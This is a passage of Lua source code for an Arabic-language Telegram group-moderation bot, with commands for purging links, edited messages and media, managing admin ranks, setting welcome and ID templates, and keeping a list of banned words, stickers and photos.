bot.sendText(msg.chat_id,msg.id,"*• ارسل القوانين الان*","md", true)
end
if text == 'مسح القوانين' or text == 'حذف القوانين' then
redis:del(bot_id..":"..msg.chat_id..":Law")
bot.sendText(msg.chat_id,msg.id,"*• تم "..text.." *","md", true)
end
if text == "تنظيف الروابط" or text == "مسح الروابط" then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
bot.sendText(msg.chat_id,msg.id,"*↯︙يتم البحث عن روابط .*","md",true)  
msgid = (msg.id - (1048576*250))
y = 0
r = 1048576
for i=1,250 do
r = r + 1048576
Delmsg = bot.getMessage(msg.chat_id,msgid + r)
if Delmsg and Delmsg.content and Delmsg.content.text then
textlin = Delmsg.content.text.text
else
textlin = nil
end
if textlin and textlin:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or 
textlin and textlin:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or 
textlin and textlin:match("[Tt].[Mm][Ee]/") or
textlin and textlin:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or 
textlin and textlin:match(".[Pp][Ee]") or 
textlin and textlin:match("[Hh][Tt][Tt][Pp][Ss]://") or 
textlin and textlin:match("[Hh][Tt][Tt][Pp]://") or 
textlin and textlin:match("[Ww][Ww][Ww].") or 
textlin and textlin:match(".[Cc][Oo][Mm]") or 
textlin and textlin:match("[Hh][Tt][Tt][Pp][Ss]://") or 
textlin and textlin:match("[Hh][Tt][Tt][Pp]://") or 
textlin and textlin:match("[Ww][Ww][Ww].") or 
textlin and textlin:match(".[Cc][Oo][Mm]") or 
textlin and textlin:match(".[Tt][Kk]") or 
textlin and textlin:match(".[Mm][Ll]") or 
textlin and textlin:match(".[Oo][Rr][Gg]") then 
bot.deleteMessages(msg.chat_id,{[1]= Delmsg.id}) 
y = y + 1
end
end
if y == 0 then 
t = "*↯︙لم يتم العثور على روابط ضمن 250 رساله السابقه*"
else
t = "*↯︙تم حذف ( "..y.." ) من الروابط *"
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == "تنظيف التعديل" or text == "مسح التعديل" then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
bot.sendText(msg.chat_id,msg.id,"*↯︙اصبر ابحثلك عن الرسائل المعدله*","md",true)
msgid = (msg.id - (1048576*250))
y = 0
r = 1048576
for i=1,250 do
r = r + 1048576
Delmsg = bot.getMessage(msg.chat_id,msgid + r)
if Delmsg and Delmsg.edit_date and Delmsg.edit_date ~= 0 then
bot.deleteMessages(msg.chat_id,{[1]= Delmsg.id}) 
y = y + 1
end
end
if y == 0 then 
t = "*↯︙مالقيت رسائل معدله*"
else
t = "*↯︙تم مسحت ( "..y.." ) من الرسائل المعدله *"
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == "تنظيف الميديا" or text == "مسح الميديا" then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
bot.sendText(msg.chat_id,msg.id,"*↯︙اصبر ابحثلك عن الميديا*","md",true)
msgid = (msg.id - (1048576*250))
y = 0
r = 1048576
for i=1,250 do
r = r + 1048576
Delmsg = bot.getMessage(msg.chat_id,msgid + r)
if Delmsg and Delmsg.content and Delmsg.content.luatele ~= "messageText" then
bot.deleteMessages(msg.chat_id,{[1]= Delmsg.id}) 
y = y + 1
end
end
if y == 0 then 
t = "*↯︙مالقيت ميديا*"
else
t = "*↯︙تم مسحت ( "..y.." ) من الميديا *"
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'رفع الادمنيه' then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
if msg.can_be_deleted_for_all_users == false then
bot.sendText(msg.chat_id,msg.id,"*• البوت لا يملك صلاحيات*","md",true)  
return false
end
local info_ = bot.getSupergroupMembers(msg.chat_id, "Administrators", "*", 0, 200)
local list_ = info_.members
y = 0
for k, v in pairs(list_) do
if info_.members[k].bot_info == nil then
if info_.members[k].status.luatele == "chatMemberStatusCreator" then
redis:sadd(bot_id..":"..msg.chat_id..":Status:Creator",v.member_id.user_id) 
else
redis:sadd(bot_id..":"..msg.chat_id..":Status:Administrator",v.member_id.user_id) 
y = y + 1
end
end
end
bot.sendText(msg.chat_id,msg.id,'*↯︙تم رفعت ( '..y..' ) ادمن بالمجموعة*',"md",true)  
end
if text == 'تعين ترحيب' or text == 'تعيين ترحيب' or text == 'وضع ترحيب' or text == 'ضع ترحيب' then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":we:add",true)
bot.sendText(msg.chat_id,msg.id,"*• ارسل الان الترحيب الجديد\n• يمكنك اضافه :*\n• `user` > *يوزر المستخدم*\n• `name` > *اسم المستخدم*","md", true)
end
if text == 'الترحيب' then
if redis:get(bot_id..":"..msg.chat_id..":Welcome") then
t = redis:get(bot_id..":"..msg.chat_id..":Welcome")
else 
t = "*• لم يتم وضع ترحيب*"
end
bot.sendText(msg.chat_id,msg.id,t,"md", true)
end
if text == 'مسح الترحيب' or text == 'حذف الترحيب' then
redis:del(bot_id..":"..msg.chat_id..":Welcome")
bot.sendText(msg.chat_id,msg.id,"*• تم "..text.." *","md", true)
end
if text == 'مسح الايدي عام' or text == 'مسح الايدي العام' or text == 'مسح ايدي عام' then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
redis:del(bot_id..":iid")
bot.sendText(msg.chat_id,msg.id,"*• تم "..text.." *","md", true)
end
if text == 'مسح الايدي' or text == 'حذف الايدي' then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
redis:del(bot_id..":"..msg.chat_id..":id")
bot.sendText(msg.chat_id,msg.id,"*• تم "..text.." *","md", true)
end
if text == 'تعين الايدي عام' or text == 'تعيين الايدي عام' then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":iid:adds",true)
bot.sendText(msg.chat_id,msg.id,"*• ارسل الان النص\n• يمكنك اضافه :*\n• `#name` > *اسم المستخدم*\n• `[#username]` > *يوزر المستخدم*\n• `#msgs` > *عدد رسائل المستخدم*\n• `#photos` > *عدد صور المستخدم*\n• `#id` > *ايدي المستخدم*\n• `#auto` > *تفاعل المستخدم*\n• `#stast` > *موقع المستخدم* \n• `#edit` > *عدد التعديلات*\n• `#AddMem` > *عدد الجهات*\n• `#Description` > *تعليق الصوره*","md", true)
end
if text == 'تعين الايدي' or text == 'تعيين الايدي' then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":id:add",true)
bot.sendText(msg.chat_id,msg.id,"*• ارسل الان النص\n• يمكنك اضافه :*\n• `#name` > *اسم المستخدم*\n• `[#username]` > *يوزر المستخدم*\n• `#msgs` > *عدد رسائل المستخدم*\n• `#photos` > *عدد صور المستخدم*\n• `#id` > *ايدي المستخدم*\n• `#auto` > *تفاعل المستخدم*\n• `#stast` > *موقع المستخدم* \n• `#edit` > *عدد التعديلات*\n• `#AddMem` > *عدد الجهات*\n• `#Description` > *تعليق الصوره*","md", true)
end
if text == "تغيير الايدي" or text == "تغير الايدي" then 
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local List = {'◇︰𝘜𝘴𝘌𝘳 - #username \n◇︰𝘪𝘋 - #id\n◇︰𝘚𝘵𝘈𝘴𝘵 - #stast\n◇︰𝘈𝘶𝘛𝘰 - #cont \n◇︰𝘔𝘴𝘎𝘴 - #msgs','◇︰Msgs : #msgs .\n◇︰ID : #id .\n◇︰Stast : #stast .\n◇︰UserName : #username .','˛ َ𝖴ᥱ᥉ : #username  .\n˛ َ𝖲𝗍ُɑِ  : #stast   . \n˛ َ𝖨ժ : #id  .\n˛ َ𝖬⁪⁬⁮᥉𝗀ِ : #msgs   .','⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 ??𝒐 𝑮𝒓𝒐𝒖𝒑 ★\n- 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏\n- 🖤 | 𝑺𝑻𝑨 : #stast \n- 🖤 | 𝑰𝑫 : #id ‌‌‏\n- 🖤 | 𝑴𝑺𝑮 : #msgs','◇︰𝖬𝗌𝗀𝗌 : #msgs  .\n◇︰𝖨𝖣 : #id  .\n◇︰𝖲𝗍𝖺𝗌𝗍 : #stast .\n◇︰𝖴𝗌𝖾𝗋??𝖺𝗆𝖾 : #username .','⌁ Use ⇨{#username} \n⌁ Msg⇨ {#msgs} \n⌁ Sta ⇨ {#stast} \n⌁ iD ⇨{#id} \n▿▿▿','゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .\n゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .\n゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .\n゠𝙸𝙳 𖨈 #id 𖥲 .','▹ 𝙐SE?? 𖨄 #username  𖤾.\n▹ 𝙈𝙎𝙂 𖨄 #msgs  𖤾.\n▹ 𝙎𝙏?? 𖨄 #stast  𖤾.\n▹ 𝙄?? 𖨄 #id 𖤾.','➼ : 𝐼𝐷 𖠀 #id\n➼ : 𝑈𝑆𝐸𝑅 𖠀 #username\n➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs\n➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast\n➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit\n','┌ 𝐔𝐒𝐄𝐑 𖤱 #username 𖦴 .\n├ 𝐌𝐒?? 𖤱 #msgs 𖦴 .\n├ 𝐒𝐓𝐀 𖤱 #stast 𖦴 .\n└ 𝐈𝐃 𖤱 #id 𖦴 .','୫ 𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➤ #username\n୫ 𝙈𝙀𝙎𝙎𝘼𝙂𝙀𝙎 ➤ #msgs\n୫ 𝙎𝙏𝘼𝙏𝙎 ➤ #stast\n୫ 𝙄𝘿 ➤ #id','☆-𝐮𝐬𝐞𝐫 : #username 𖣬  \n☆-𝐦𝐬𝐠  : #msgs 𖣬 \n☆-𝐬𝐭𝐚 : #stast 𖣬 \n☆-𝐢𝐝  : #id 𖣬','𝐘𝐨𝐮𝐫 𝐈𝐃 ☤- #id \n𝐔𝐬𝐞𝐫𝐍𝐚☤- #username \n𝐒𝐭𝐚??𝐓 ☤- #stast \n𝐌𝐬𝐠𝐒☤ - #msgs','.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  \n.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast\n.𖣂 𝙡𝘿 , #id  \n.𖣂 𝙂𝙖𝙢𝙨 , #game  \n.𖣂 𝙢𝙨𝙂𝙨 , #msgs'}
local Text_Rand = List[math.random(#List)]
redis:set(bot_id..":"..msg.chat_id..":id",Text_Rand)
bot.sendText(msg.chat_id,msg.id,"*• تم تغير الايدي*","md",true)  
end
if text == 'مسح الرابط' or text == 'حذف الرابط' then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
redis:del(bot_id..":"..msg.chat_id..":link")
bot.sendText(msg.chat_id,msg.id,"*• تم "..text.." *","md", true)
end
if text == 'تعين الرابط' or text == 'تعيين الرابط' or text == 'وضع رابط' or text == 'تغيير الرابط' or text == 'تغير الرابط' then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":link:add",true)
bot.sendText(msg.chat_id,msg.id,"*↯︙ارسلي الرابط الجديد*","md", true)
end
if text == 'كشف البوت' then
local StatusMember = bot.getChatMember(msg.chat_id,bot_id).status.luatele
if (StatusMember ~= "chatMemberStatusAdministrator") then
bot.sendText(msg.chat_id,msg.id,'*• البوت عضو في المجموعة*',"md",true) 
return false
end
local GetMemberStatus = bot.getChatMember(msg.chat_id,bot_id).status
if GetMemberStatus.can_change_info then
change_info = '✔️' else change_info = '❌'
end
if GetMemberStatus.can_delete_messages then
delete_messages = '✔️' else delete_messages = '❌'
end
if GetMemberStatus.can_invite_users then
invite_users = '✔️' else invite_users = '❌'
end
if GetMemberStatus.can_pin_messages then
pin_messages = '✔️' else pin_messages = '❌'
end
if GetMemberStatus.can_restrict_members then
restrict_members = '✔️' else restrict_members = '❌'
end
if GetMemberStatus.can_promote_members then
promote = '✔️' else promote = '❌'
end
PermissionsUser = '*\n• صلاحيات البوت في المجموعة :\n ━━━━━━━━━━━ '..'\n• تغيير المعلومات : '..change_info..'\n• تثبيت الرسائل : '..pin_messages..'\n• اضافه مستخدمين : '..invite_users..'\n• مسح الرسائل : '..delete_messages..'\n• حظر المستخدمين : '..restrict_members..'\n• اضافه المشرفين : '..promote..'\n\n*'
bot.sendText(msg.chat_id,msg.id,PermissionsUser,"md",true) 
return false
end
if not redis:get(bot_id..":"..msg.chat_id..":settings:delmsg") then
if text == ("امسح") and BasicConstructor(msg) then  
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local list = redis:smembers(bot_id..":"..msg.chat_id..":mediaAude:ids")
for k,v in pairs(list) do
local Message = v
if Message then
t = "• تم مسح "..k.." من الوسائط الموجوده"
bot.deleteMessages(msg.chat_id,{[1]= Message})
redis:del(bot_id..":"..msg.chat_id..":mediaAude:ids")
end
end
if #list == 0 then
t = "• لا يوجد ميديا في المجموعة"
end
Text = Reply_Status(msg.sender.user_id,"*"..t.."*").by
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text and text:match('^مسح (%d+)$') then
local NumMessage = text:match('^مسح (%d+)$')
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
if msg.can_be_deleted_for_all_users == false then
bot.sendText(msg.chat_id,msg.id,"*• البوت ليس ادمن في المجموعة*","md",true)  
return false
end
if GetInfoBot(msg).Delmsg == false then
bot.sendText(msg.chat_id,msg.id,"*• البوت لا يمتلك صلاحيه مسح الرسائل*","md",true)  
return false
end
if tonumber(NumMessage) > 1000 then
bot.sendText(msg.chat_id,msg.id,'* لا تستطيع مسح اكثر من 1000 رساله*',"md",true)  
return false
end
local Message = msg.id
for i=1,tonumber(NumMessage) do
bot.deleteMessages(msg.chat_id,{[1]= Message})
Message = Message - 1048576
end
bot.sendText(msg.chat_id, msg.id,"*↯︙مسحت ( "..NumMessage.." ) رسالة *", 'md')
end
end

if text == "تنزيل جميع الرتب" or text == 'مسح الرتب' or text == 'حذف الرتب' and tonumber(msg.reply_to_message_id) == 0 then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local StatusMember = bot.getChatMember(msg.chat_id,msg.sender.user_id).status.luatele
if not (StatusMember == "chatMemberStatusCreator") then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص مالك المجموعة فقط * ',"md",true)  
end
local Info_Members1 = redis:smembers(bot_id..":"..msg.chat_id..":Status:BasicConstructor") 
local Info_Members2 = redis:smembers(bot_id..":"..msg.chat_id..":Status:Constructor") 
local Info_Members3 = redis:smembers(bot_id..":"..msg.chat_id..":Status:Owner") 
local Info_Members4 = redis:smembers(bot_id..":"..msg.chat_id..":Status:Administrator") 
local Info_Members5 = redis:smembers(bot_id..":"..msg.chat_id..":Status:Vips") 
redis:del(bot_id..":"..msg.chat_id..":Status:BasicConstructor") 
redis:del(bot_id..":"..msg.chat_id..":Status:Constructor") 
redis:del(bot_id..":"..msg.chat_id..":Status:Owner") 
redis:del(bot_id..":"..msg.chat_id..":Status:Administrator") 
redis:del(bot_id..":"..msg.chat_id..":Status:Vips")
if #Info_Members1 == 0 and #Info_Members2 == 0 and #Info_Members3 == 0 and #Info_Members4 == 0 and #Info_Members5 == 0 then
bot.sendText(msg.chat_id, msg.id,"*↯︙مسحت كل الرتب المضافة*", 'md')
else
bot.sendText(msg.chat_id,msg.id,"*↯︙اهلين عيني المالك الاساسي ⇓ \n\n↯︙نزلت ( "..#Info_Members1.." ) من المنشئين الاساسيين\n↯︙نزلت ( "..#Info_Members2.." ) من المنشئين\n↯︙نزلت ( "..#Info_Members3.." ) من المدراء\n↯︙نزلت ( "..#Info_Members4.." ) من الادمن\n↯︙نزلت ( "..#Info_Members5.." ) من المميزين *","md",true)
end
end
if text and text:match("^تغير رد المطور (.*)$") then
local Teext = text:match("^تغير رد المطور (.*)$") 
redis:set(bot_id.."Reply:developer"..msg.chat_id,Teext)
bot.sendText(msg.chat_id,msg.id,"*• تم تغيير الرد الى : *"..Teext.. "", 'md')
elseif text and text:match("^تغير رد المالك (.*)$") then
local Teext = text:match("^تغير رد المالك (.*)$") 
redis:set(bot_id..":Reply:Creator"..msg.chat_id,Teext)
bot.sendText(msg.chat_id,msg.id,"*• تم تغيير الرد الى : *"..Teext.. "", 'md')
elseif text and text:match("^تغير رد المنشئ الاساسي (.*)$") then
local Teext = text:match("^تغير رد المنشئ الاساسي (.*)$") 
redis:set(bot_id..":Reply:BasicConstructor"..msg.chat_id,Teext)
bot.sendText(msg.chat_id,msg.id,"*• تم تغيير الرد الى : *"..Teext.. "", 'md')
elseif text and text:match("^تغير رد المنشئ (.*)$") then
local Teext = text:match("^تغير رد المنشئ (.*)$") 
redis:set(bot_id..":Reply:Constructor"..msg.chat_id,Teext)
bot.sendText(msg.chat_id,msg.id,"*• تم تغيير الرد الى : *"..Teext.. "", 'md')
elseif text and text:match("^تغير رد المدير (.*)$") then
local Teext = text:match("^تغير رد المدير (.*)$") 
redis:set(bot_id..":Reply:Owner"..msg.chat_id,Teext) 
bot.sendText(msg.chat_id,msg.id,"*• تم تغيير الرد الى : *"..Teext.. "", 'md')
elseif text and text:match("^تغير رد الادمن (.*)$") then
local Teext = text:match("^تغير رد الادمن (.*)$") 
redis:set(bot_id..":Reply:Administrator"..msg.chat_id,Teext)
bot.sendText(msg.chat_id,msg.id,"*• تم تغيير الرد الى : *"..Teext.. "", 'md')
elseif text and text:match("^تغير رد المميز (.*)$") then
local Teext = text:match("^تغير رد المميز (.*)$") 
redis:set(bot_id..":Reply:Vips"..msg.chat_id,Teext)
bot.sendText(msg.chat_id,msg.id,"*• تم تغيير الرد الى : *"..Teext.. "", 'md')
elseif text and text:match("^تغير رد العضو (.*)$") then
local Teext = text:match("^تغير رد العضو (.*)$") 
redis:set(bot_id..":Reply:mem"..msg.chat_id,Teext)
bot.sendText(msg.chat_id,msg.id,"*• تم تغيير الرد الى : *"..Teext.. "", 'md')
elseif text == 'مسح رد المطور' then
redis:del(bot_id..":Reply:developer"..msg.chat_id)
bot.sendText(msg.chat_id,msg.id,"*• تم "..text.."*", 'md')
elseif text == 'مسح رد المالك' then
redis:del(bot_id..":Reply:Creator"..msg.chat_id)
bot.sendText(msg.chat_id,msg.id,"*• تم "..text.." *", 'md')
elseif text == 'مسح رد المنشئ الاساسي' then
redis:del(bot_id..":Reply:BasicConstructor"..msg.chat_id)
bot.sendText(msg.chat_id,msg.id,"*• تم "..text.." *", 'md')
elseif text == 'مسح رد المنشئ' then
redis:del(bot_id..":Reply:Constructor"..msg.chat_id)
bot.sendText(msg.chat_id,msg.id,"*• تم "..text.."*", 'md')
elseif text == 'مسح رد المدير' then
redis:del(bot_id..":Reply:Owner"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,"*• تم "..text.." *", 'md')
elseif text == 'مسح رد الادمن' then
redis:del(bot_id..":Reply:Administrator"..msg.chat_id)
bot.sendText(msg.chat_id,msg.id,"*• تم "..text.." *", 'md')
elseif text == 'مسح رد المميز' then
redis:del(bot_id..":Reply:Vips"..msg.chat_id)
bot.sendText(msg.chat_id,msg.id,"*• تم "..text.." *", 'md')
elseif text == 'مسح رد العضو' then
redis:del(bot_id..":Reply:mem"..msg.chat_id)
bot.sendText(msg.chat_id,msg.id,"*• تم "..text.." *", 'md')
end
if text == 'الغاء تثبيت الكل' or text == 'الغاء التثبيت' then
if GetInfoBot(msg).PinMsg == false then
bot.sendText(msg.chat_id,msg.id,'*• ليس لدي صلاحيه تثبيت رسائل*',"md",true)  
return false
end
bot.sendText(msg.chat_id,msg.id,"*• تم الغاء تثبيت جميع الرسائل المثبته*","md",true)
bot.unpinAllChatMessages(msg.chat_id) 
end
end
if BasicConstructor(msg) then
----------------------------------------------------------------------------------------------------
if text == "قائمه المنع" or text == "الممنوعات" or text == "قائمة المنع" then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
local Photo =redis:scard(bot_id.."mn:content:Photo"..msg.chat_id) 
local Animation =redis:scard(bot_id.."mn:content:Animation"..msg.chat_id)  
local Sticker =redis:scard(bot_id.."mn:content:Sticker"..msg.chat_id)  
local Text =redis:scard(bot_id.."mn:content:Text"..msg.chat_id)  
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = 'الصور الممنوعه', data="mn_"..msg.sender.user_id.."_ph"},{text = 'الكلمات الممنوعه', data="mn_"..msg.sender.user_id.."_tx"}},
{{text = 'المتحركه الممنوعه', data="mn_"..msg.sender.user_id.."_gi"},{text = 'الملصقات الممنوعه',data="mn_"..msg.sender.user_id.."_st"}},
{{text = 'تحديث',data="mn_"..msg.sender.user_id.."_up"}},
}
}
bot.sendText(msg.chat_id,msg.id,"* • تحوي قائمه المنع على\n• الصور ( "..Photo.." )\n• الكلمات ( "..Text.." )\n• الملصقات ( "..Sticker.." )\n• المتحركه ( "..Animation.." ) \n• اضغط على القائمه المراد مسحها*","md",true, false, false, false, reply_markup)
return false
end
if text == "مسح قائمه المنع" or text == "مسح الممنوعات" then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
bot.sendText(msg.chat_id,msg.id,"*- تم "..text.."  *","md",true)  
redis:del(bot_id.."mn:content:Text"..msg.chat_id) 
redis:del(bot_id.."mn:content:Sticker"..msg.chat_id) 
redis:del(bot_id.."mn:content:Animation"..msg.chat_id) 
redis:del(bot_id.."mn:content:Photo"..msg.chat_id) 
end
if text == "منع" and msg.reply_to_message_id == 0 then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
bot.sendText(msg.chat_id,msg.id,"*• ارسل ( نص او الميديا ) لمنعه من المجموعة*","md",true)  
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":mn:set",true)
end
if text == "منع" and msg.reply_to_message_id ~= 0 then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if Remsg.content.text then   
if redis:sismember(bot_id.."mn:content:Text"..msg.chat_id,Remsg.content.text.text) then
bot.sendText(msg.chat_id,msg.id,"*• تم منع الكلمه سابقاً*","md",true)
return false
end
redis:sadd(bot_id.."mn:content:Text"..msg.chat_id,Remsg.content.text.text)  
ty = "الرساله"
elseif Remsg.content.sticker then   
if redis:sismember(bot_id.."mn:content:Sticker"..msg.chat_id,Remsg.content.sticker.sticker.remote.unique_id) then
bot.sendText(msg.chat_id,msg.id,"*• تم منع الملصق سابقاً*","md",true)
return false
end
redis:sadd(bot_id.."mn:content:Sticker"..msg.chat_id, Remsg.content.sticker.sticker.remote.unique_id)  
ty = "الملصق"
elseif Remsg.content.animation then
if redis:sismember(bot_id.."mn:content:Animation"..msg.chat_id,Remsg.content.animation.animation.remote.unique_id) then
bot.sendText(msg.chat_id,msg.id,"*• تم منع المتحركه سابقاً*","md",true)
return false
end
redis:sadd(bot_id.."mn:content:Animation"..msg.chat_id, Remsg.content.animation.animation.remote.unique_id)  
ty = "المتحركه"
elseif Remsg.content.photo then
if redis:sismember(bot_id.."mn:content:Photo"..msg.chat_id,Remsg.content.photo.sizes[1].photo.remote.unique_id) then
bot.sendText(msg.chat_id,msg.id,"*• تم منع الصوره سابقاً*","md",true)
return false
end
redis:sadd(bot_id.."mn:content:Photo"..msg.chat_id,Remsg.content.photo.sizes[1].photo.remote.unique_id)  
ty = "الصوره"
end
bot.sendText(msg.chat_id,msg.id,"*• تم منع "..ty.." *","md",true)  
end
if text == "الغاء منع" and msg.reply_to_message_id ~= 0 then
Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if Remsg.content.text then   
redis:srem(bot_id.."mn:content:Text"..msg.chat_id,Remsg.content.text.text)  
ty = "الرساله"
elseif Remsg.content.sticker then   
redis:srem(bot_id.."mn:content:Sticker"..msg.chat_id, Remsg.content.sticker.sticker.remote.unique_id)  
ty = "الملصق"
elseif Remsg.content.animation then
redis:srem(bot_id.."mn:content:Animation"..msg.chat_id, Remsg.content.animation.animation.remote.unique_id)  
ty = "المتحركه"
